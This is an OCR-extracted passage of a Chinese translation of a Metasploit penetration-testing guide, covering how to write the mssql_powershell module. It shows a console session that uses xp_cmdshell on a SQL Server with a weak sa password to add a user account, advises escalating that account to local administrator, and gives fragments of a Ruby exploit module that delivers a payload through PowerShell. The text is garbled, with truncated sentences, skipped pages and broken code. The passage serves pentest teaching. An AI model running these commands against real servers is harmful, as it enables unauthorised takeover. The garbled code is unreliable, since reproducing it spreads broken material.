## Page 212
第
章
编写你自己的模块
的主意。由于Metasploit主要由Ruby语言实现，因此我们在本章中都将围绕着Ruby编程语言。如
果你还不是一位Ruby“忍者”的话，或者你甚至还没听说过这种语言，请不要退缩，继续跟随我
们实践和学习。只要你愿意，学习Ruby语言那是相当容易的。如果你发现你不能够理解本章中的一
些Ruby概念，你可以先暂时跳过本章，先尝试建立起你的Ruby语言知识，然后重新回来阅读本章。
在本章中，我们将编写一个名为mssql_powershell的模块，来实现在第18届Defcon会议上
由JoshKelley（winfang）和DavidKennedy所发布的一项渗透技术，这个模块的攻击目标是安
装了微软PowerShell的Windows操作系统（默认是Windows7）。
MSSQL语句传输到目标系统上，在这个攻击负荷被发送到目标系统上后，将由一段PowerShell
脚本将十六进制的数据重新恢复到一个二进制可执行文件，然后执行它，并为攻击者提供一个
shell会话。这个模块目前已经加入了Metasploit框架中，并且是由本书作者开发的，我们在这
里使用这个案例来讲解如何来编写你自己的模块。
---
## Page 213
Metasploit渗透测试指南
进行渗透测试时，你将会遇到很多种并不熟悉的场景和境遇，这时如果你拥有编写和修改模块
的能力，并可以利用自己定制的模块实施渗透攻击，那么你离真正的渗透测试师又近了一步。
如果你熟悉了Metasploit框架，就可以在一个相当短的时间里，编写出这种类型的模块。
13.1在MSSQL上进行命令执行
在第6章中我们已经提到，大多数的系统管理员将MSSQL的管理员账户（sa）的口令都
设置为弱密码，而且他们甚至都没有意识到这么白痴的错误会造成的严重后果。Sa账户默认是
MSSQL数据库系统中的sysadmin角色，当你进行渗透测试时，很多情况下都会在一些MSSQL
服务器实例上发现设置了空口令或弱密码的sa账号。我们将使用你根据附录A所创建出的MS
SQL服务器靶机环境，来演示如何使用我们的模块进行渗透攻击。正如我们已经在第6章介绍
的那样，你可以使用Metasploit中的辅助模块来扫描出MSSQL服务实例，并对弱密码的sa账
户进行口令暴力破解。
当你已经“爆破”了一个sa账户之后，你就可以在MSSQL数据库中任意地插入、删除、
而这个存储过程使得你可以在MSSQL服务器服务的运行账户环境（通常是LocalSystem）下
执行底层操作系统命令。
Sysadmin角色权限就可以使用SQL命令来重新激活该存储过程。例如，你可以使用SELECT
loginnameFROMmaster.sysloginsWHEREsysadmin=1语句来查看拥有sysadmin角色的用户
列表，然后尝试获取其中一个用户的控制权。当你已经拥有了sysadmin角色之后，你实际上
已经攻陷了整个MSSQL系统。
接下来的命令演示了如何通过Metasploit中的MSSQL扩展模块来运行一些底层操作系统
命令：
0use msf>use admin/mssql/mssql_exec
@ msf auxiliary(mssql_exec) > show options
Module options:
Name
Current Setting
RequiredDescription
CMD
cmd.exe/cechoOwNED>C:\owned.exeno
Command to execute
PASSWORD
no
The password for the
 specified username
RHOST
yes
The target address
RPORT
1433
yes
The target port
USERNAMESa
no
Theusername toauthenticate as
186
---
## Page 214
第13章编写你自己的模块
③ msf auxiliary(mssql_exec)>set RH0ST 172.16.32.136
RHOST => 172.16.32.136
CMD =>netuser metasploit p@55w0rd/ADD
msf auxiliary(mssql_exec)>exploit
[*]SQL Query: EXEC master..xp_cmdshell'net user metasploit p@55word /ADD'
output
 The command completed successfully.
[*]Auxiliary module execution completed
ms+ auxiliary(mssql_exec)>
在这个例子中，我们首先选择了mssql_exec的扩展模块O，该模块实际上是通过调用
xp_cmdshell存储过程来执行操作系统命令。接下来，我们查看了该模块的配置选项列表?，并
设置了目标主机③，然后输入了将要执行的操作系统命令O，最后我们通过exploit命令执行渗
透攻击。你可以看到渗透攻击成功执行6，我们已经利用xp_cmdshell命令成功地在系统中加入
了一个用户。（在这时，我们可以再执行net localgroup administrators metasploit /ADD命令，
将该用户加入到被攻陷系统的本地管理员组）
通过上述例子，你可以发现，mssql_exec模块其实就是一个通过MSSQL服务进行访问的
命令行shell。
13.2探索一个已存在的Metasploit模块
现在我们将深入分析刚刚使用过的这个mssql_exec模块，来看看它是如何实现的。这使得
个文本编辑器来打开这个模块的源码，来看看它是如何工作的：
下面的代码行是从模块源码中摘要出来的，其中包含了一些需要我们关注的重点：
0require'msf/core
 class Metasploit3['David Kennedy "ReLik" '］,
'License'
=> MSF_LICENSE，
'Version'
=>‘$Revision:8771 $',
'References
=>
['URL'，'http://www.secmaniac.com']
]，
'Platform'
=>'win'，# target only windows
'Targets'
=>
['Automatic'，{}]，# automatic targeting
1,
③'DefaultTarget'′=>0
)）
register_options(#register options for the user to pick from
OOptBool.new('UsePowerShell',[ false,"Use PowerShell as payload delivery
method instead"，true])，# default to PowerShell
1)
end
def exploit # define our exploit here; it does nothing at this point
@handler#calltheMetasploithandler
disconnect # after handler disconnect
end
end
在这个渗透攻击模块能够正常工作之前，你还需要定义一些基本的设置。请注意定义的
名称、描述、版权和参考索引lO，之后我们定义模块的运行平台（Windows）?以及目标系统
类型（所有操作系统类型）。同时我们定义一个名为UsePowerShell的新参数·，在渗透攻
击模块的主体代码中使用。最后指定一个处理例程，来处理攻击者和被攻击目标系统间的
连接。
13.3.2运行Shell渗透攻击
在完成了渗透测试模块的框架之后，我们在MSF终端中运行这个模块，来看看它提供了哪
些选项：
msf > use windows/mssql/mssql_powershell
msf exploit(mssql_powershell) > show options
190
---
## Page 218
第13章编写你自己的模块
Module options:
Name
Current Setting Required Description
PASSWORD
no
The password for the specified username
RHOST
yes
The target address
RPORT
1433
yes
The target port
USERNAME
sa
no
The username to authenticate as
UsePowerShelltrue
no
Use PowerShell as payload delivery method instead
还记得第5章中介绍的showoptions命令吗？运行该命令可以显示出添加到这个渗透攻击
模块中的所有配置选项。
现在我们将最终完成从本章开始就在编写的mssql_powershell.rb文件，然后进入到另外一
个mssql.rb文件中。
当你在Metasploit的模块目录（modules/exploits,modules/auxiliary）中查看各种渗透攻击模
块的源码时，你会发现大多数模块拥有几乎相同的结构，比如都拥有一段“defexploit”代码。
永远都要记住给你的代码加上足够的注释，让别的开发者能够知道这些代码都是干吗的！在下
面的源码中，我们将首先引l入defexploit代码，这段代码定义了我们的渗透攻击过程是如何工
作的，然后我们与其他大多数模块一样将渗透代码分为几个组成部分，并在后面的小节中逐一
解释。
defexploit
#if u/nandp/wdidn't workthrow error
Oif(not mssql_login_datastore)
@print_status("Invalid SQL Server credentials")
return
end
# Use powershell method for payload delivery
③if (datastore['UsePowerShell'])
powershell_upload_exec(Msf::Util::ExE.to_win32pe(framework,payload.encoded))
end
handler
disconnect
end
end
Credentials”的错误信息。UsePowerShell方法是用来调用powershell_upload_exec函数的?，
这个函数将自动地创建出一个我们在渗透测试中指定的Metasploit攻击载荷。在我们最终运行这